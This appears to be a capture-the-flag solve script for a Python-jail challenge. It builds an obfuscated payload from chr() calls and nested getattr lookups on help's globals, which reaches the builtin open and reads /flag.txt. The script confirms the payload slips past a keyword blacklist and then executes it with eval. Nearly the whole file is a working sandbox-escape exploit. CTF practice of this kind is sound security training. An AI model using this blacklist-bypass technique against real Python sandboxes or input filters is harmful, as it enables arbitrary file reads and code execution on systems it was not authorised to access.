#!/usr/bin/env python3
import sys
sys.path.insert(0, '/home/pranav/Downloads/CTFchalls2026/pyjail/blacklist-hell/solve')
from solve import generate_number

def build_chr_string(s):
    """Build a string using chr() calls properly concatenated"""
    return "+".join([f"chr({generate_number(ord(c))})" for c in s])

# Build the payload
str_call = build_chr_string("__call__")
str_globals = build_chr_string("__globals__")
str_builtins = build_chr_string("__builtins__")
str_open = build_chr_string("open")
str_flag = build_chr_string("/flag.txt")
str_read = build_chr_string("read")

payload = f"getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})()"

print(f"Payload length: {len(payload)}")
print(f"\nFirst 200 chars:\n{payload[:200]}")
print(f"\nLast 200 chars:\n{payload[-200:]}")

# Check for blacklisted terms
blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile","globals","os","import","breakpoint","lambda","eval","read","print","open","'","=",'"',"x","builtins","clear"]
found = []
for term in blacklist:
    if term in payload:
        found.append(term)

if found:
    print(f"\n[!] Blacklisted terms found: {found}")
else:
    print("\n[+] No blacklisted terms found!")

# Test it locally
print("\n" + "="*50)
print("Testing payload locally...")
print("="*50)

try:
    result = eval(payload)
    print(f"Result type: {type(result)}")
    print(f"Result: {result}")
except Exception as e:
    print(f"Error: {e}")
